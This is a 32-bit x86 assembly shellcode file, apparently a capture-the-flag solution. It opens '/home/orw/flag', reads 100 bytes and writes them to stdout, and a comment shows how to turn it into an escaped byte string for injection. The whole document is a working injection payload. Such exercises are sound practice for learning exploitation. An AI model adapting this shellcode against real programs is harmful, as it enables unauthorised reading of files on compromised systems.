;  nasm code.asm ;  xxd -p code |tr -d '\n' | sed 's/\(..\)/\\x\1/g'
BITS 32
section .text
  global _start

_start:
  xor eax, eax
  xor ebx, ebx
  xor ecx, ecx
  xor edx, edx
  ; open(const char *filename, int flags, umode_t mode)
  push 0x00006761
  push 0x6c662f77
  push 0x726f2f65
  push 0x6d6f682f
  mov ebx, esp
  mov ecx, 0                ; none
  mov edx, 0                ; O_RDONLY 
  mov al, 0x5
  int 0x80
  ; read(unsigned int fd, char *buf, size_t count)
  mov ebx, eax              ; got fd from 'open'
  mov ecx, esp              ; save content here
  mov edx, 100              ; read 100 bytes
  mov al, 0x3           
  int 0x80
  ; write(unsigned int fd, const char *buf, size_t count)
  mov ebx, 1
  mov ecx, esp              ; read from here
  mov edx, 100              ; write 100 bytes
  mov al, 0x4
  int 0x80
